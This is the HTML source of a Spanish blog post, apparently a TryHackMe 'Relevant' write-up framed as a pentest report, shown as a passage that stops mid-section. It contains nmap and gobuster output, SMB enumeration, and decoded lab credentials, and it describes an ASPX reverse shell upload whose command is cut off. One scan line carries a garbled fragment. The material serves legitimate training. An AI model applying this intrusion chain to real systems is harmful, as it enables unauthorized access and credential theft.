@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Relevant, Penetration Testing Challenge [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='EternalBlue, GoBuster, Medium, Metasploit, MS17-010, PrintSpoofer, Privilege Escalation, Report, Simulation, TryHackMe, Windows' />
+    
+    
+        <meta name="description" content="quina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Relevant, Penetration Testing Challenge [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-09-09T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="EternalBlue" />
+        
+            <meta property="article:tag" content="GoBuster" />
+        
+            <meta property="article:tag" content="Medium" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="MS17-010" />
+        
+            <meta property="article:tag" content="PrintSpoofer" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Report" />
+        
+            <meta property="article:tag" content="Simulation" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="Windows" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/relevant/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/relevant/relevant.jpeg
+        ' />
+    
+        <meta property="og:description" content="Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a l" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/relevant/" />
+
+
+    <meta name="twitter:title" content="Relevant, Penetration Testing Challenge [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/relevant/relevant.jpeg
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a l" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Relevant, Penetration Testing Challenge [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-09-09
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/relevant/relevant.jpeg" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Esta máquina es un simulacro de una prueba de penetración como las que se pueden encontrar en un entorno laboral. El objetivo es obtener acceso a la máquina y escalar privilegios. Es de dificultad Media, y salvo unas instrucciones iniciales, no hay pistas. La idea de esta sala es poner en práctica los conocimientos adquiridos en otras salas, partiendo de las instrucciones de un supuesto cliente y elaborando un informe de los pasos seguidos y las conclusiones obtenidas.</p>
+<h2 id="informe-de-prueba-de-penetración">Informe de Prueba de Penetración</h2>
+<h3 id="alcance-del-trabajo">Alcance del Trabajo</h3>
+<p>Este informe detalla los resultados de una prueba de penetración realizada en un entorno virtual con la dirección IP 10.x.x.x. El objetivo principal fue evaluar la seguridad del sistema y su resistencia a posibles amenazas cibernéticas. La evaluación se llevó a cabo desde la perspectiva de un actor malicioso en un escenario de prueba de penetración de caja negra.</p>
+<p>El cliente ha solicitado la obtención de dos banderas como prueba de explotación:</p>
+<ol>
+<li>User.txt</li>
+<li>Root.txt</li>
+</ol>
+<p>El alcance permitió el uso de cualquier herramienta o técnica, con una preferencia por la explotación manual. Se requirió la identificación y documentación de todas las vulnerabilidades encontradas. Solo la dirección IP asignada a la máquina del evaluador estuvo dentro del alcance. Además, se destacó que existían múltiples rutas para obtener privilegios de root.</p>
+<h2 id="evaluación-de-vulnerabilidades-y-explotación">Evaluación de Vulnerabilidades y Explotación</h2>
+<h3 id="vulnerabilidad-1">Vulnerabilidad 1</h3>
+<p><strong>Descripción:</strong> Durante la fase de enumeración, se identificaron múltiples puertos abiertos en el sistema, incluyendo el puerto 80 (HTTP), el puerto 135 (MSRPC), el puerto 139 (NetBIOS-SSN), el puerto 445 (Microsoft-DS), el puerto 3389 (MS-WBT-Server) y los puertos 49663, 49666 y 49668 de estado desconocido.</p>
+<p><strong>Gravedad:</strong> Información inicial</p>
+<p><strong>Evidencia:</strong> Resultados del escaneo Nmap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Escaneo inicial</span>
+</span></span><span style="display:flex;"><span>  sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial <span style="color:#e6db74">&#34;</span>$ip_address<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Fri Sep  8 19:19:59 2023 as: nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial 10.x.x.x</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.44.97
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65527</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>49663/tcp open  unknown
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Fri Sep  8 19:20:38 2023 -- 1 IP address (1 host up) scanned in 39.48 seconds</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Procesar la salida del primer escaneo y extraer puertos</span>
+</span></span><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat nmap_inicial | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f1 | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escaneo final utilizando los puertos extraídos</span>
+</span></span><span style="display:flex;"><span>sudo nmap -p<span style="color:#e6db74">&#34;</span>$ports<span style="color:#e6db74">&#34;</span> -sC -sV -Pn -oN nmap_final <span style="color:#e6db74">&#34;</span>$ip_address<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Fri Sep  8 19:21:13 2023 as: nmap -p80,135,139,445,3389,49663,49666,49668 -sC -sV -Pn -oN nmap_final 10.x.x.x</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.x.x.x
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: IIS Windows Server
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open   ²9ýU        Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation <span style="color:#ae81ff">14393</span> microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>Relevant
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-07T17:15:27
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-03-08T17:15:27
+</span></span><span style="display:flex;"><span>|_ssl-date: 2023-09-08T17:22:39+00:00; -22s from scanner time.
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: RELEVANT
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: RELEVANT
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: RELEVANT
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: Relevant
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: Relevant
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.14393
+</span></span><span style="display:flex;"><span>|_  System_Time: 2023-09-08T17:22:00+00:00
+</span></span><span style="display:flex;"><span>49663/tcp open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: IIS Windows Server
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard Evaluation 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: Relevant
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: RELEVANT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2023-09-08T10:22:04-07:00
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-09-08T17:22:00
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-09-08T17:15:28
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 1h23m39s, deviation: 3h07m51s, median: -21s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Fri Sep  8 19:23:01 2023 -- 1 IP address (1 host up) scanned in 108.04 seconds</span>
+</span></span></code></pre></div><h3 id="vulnerabilidad-2">Vulnerabilidad 2</h3>
+<p><strong>Descripción:</strong> Se enumeraron las URL disponibles en los puertos HTTP identificados y se encontraron múltiples rutas que devolvieron un código de respuesta 400, lo que indica posibles vulnerabilidades o configuraciones incorrectas.</p>
+<p><strong>Gravedad:</strong> Información inicial</p>
+<p><strong>Evidencia:</strong> Resultados del escaneo Gobuster.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Comando utilizado para Gobuster</span>
+</span></span><span style="display:flex;"><span>gobuster v3.6 -u http://&lt;TARGET_IP&gt;:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.x.x.x:49663
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*checkout*           <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*docroot*            <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*                    <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fwww     <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A              <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/q%26a                <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/**http%3a            <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*http%3A             <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/**http%3A            <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fyoutube <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fblogs   <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fblog    <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/**http%3A%2F%2Fwww   <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/s%26p                <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/%3FRID%3D2671        <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/devinmoore*          <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/200109*              <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*sa_                 <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/*dc_                 <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fcommunity <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fradar   <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/q%26a2               <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/login%3f             <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/Shakira%20Oral%20Fixation%201%20%26%202 <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fjeremiahgrossman <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fweblog  <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/http%3A%2F%2Fswik    <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3420<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2K/nt4wrksv             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.x.x.x:49663/nt4wrksv/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><h3 id="vulnerabilidad-3">Vulnerabilidad 3</h3>
+<p><strong>Descripción:</strong> Se encuentra una carpeta compartida con SMB que contiene hashes de usuarios. Se subió y ejecutó con éxito un archivo de shell ASPX en el servidor IIS a través del recurso compartido SMB &ldquo;nt4wrksv&rdquo;, lo que resultó en una conexión de reverse shell en el puerto 4444.</p>
+<p><strong>Gravedad:</strong> Alta</p>
+<p><strong>Evidencia:</strong> Se estableció una conexión exitosa desde el servidor de destino al sistema de atacante a través del puerto 4444.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Identifico shares</span>
+</span></span><span style="display:flex;"><span>smbclient -L &lt;TARGET_IP&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Acceso y encuentro Passwords.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>User Passwords - Encoded<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Qm9iIC0gIVBAJCRXMHJEITEyMw<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decodifico hashes, estan en base64</span>
+</span></span><span style="display:flex;"><span>Bill - Juw4nnaM4n420696969!$$$                                                                                                                                     
+</span></span><span style="display:flex;"><span>Bob - !P@$$W0rD!123
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Comando utilizado para crear y subir la shell ASPX</span>
